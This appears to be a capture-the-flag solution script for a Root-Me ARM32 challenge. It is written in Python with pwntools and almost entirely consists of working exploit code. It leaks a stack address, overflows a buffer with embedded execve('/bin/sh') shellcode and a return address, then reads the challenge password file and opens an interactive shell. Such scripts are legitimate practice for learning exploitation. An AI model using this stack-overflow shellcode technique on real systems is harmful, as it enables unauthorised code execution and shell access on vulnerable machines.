#!/usr/bin/env python

from pwn import *

context.clear(arch="arm", os="linux", bits=32, log_level="info")

#install binutils for arm-gnueabi
#shellcraft.execve("/bin/sh")

shellcode="\x2f\x73\x07\xe3\x68\x70\x40\xe3\x04\x70\x2d\xe5\x2f\x72\x06\xe3\x69\x7e\x46\xe3\x04\x70\x2d\xe5\x0d\x00\xa0\xe1\x01\x10\x21\xe0\x02\x20\x22\xe0\x0b\x70\xa0\xe3\x00\x00\x00\xef"

#If you predict stack layout with using a disassembler, you may guess offset to link register is at 168

def pwn():
    t=remote("challenge04.root-me.org",61045)
    t.recvuntil("dump:")
    t.sendline("A"*4)
    stack=int(t.recvlines(2)[1].split(":")[0], 16)
    log.progress("Leaking stack address...")
    log.info("Stack address: 0x{:08x}".format(stack))
    t.sendlineafter(":","y")
    t.recvuntil("dump:")
    log.progress("F***in buffer with shellcode")
    t.sendline(shellcode+"A"*(164-(len(shellcode)))+p32(stack))
    log.info("Triggering...")
    t.sendline("n")
    t.clean()
    t.sendline("id")
    id=t.recvline()
    log.info("Logging in as: {}".format(id))
    t.sendline("cat /challenge/app-systeme/ch45/.passwd")
    t.interactive()
if __name__=="__main__":
    pwn()

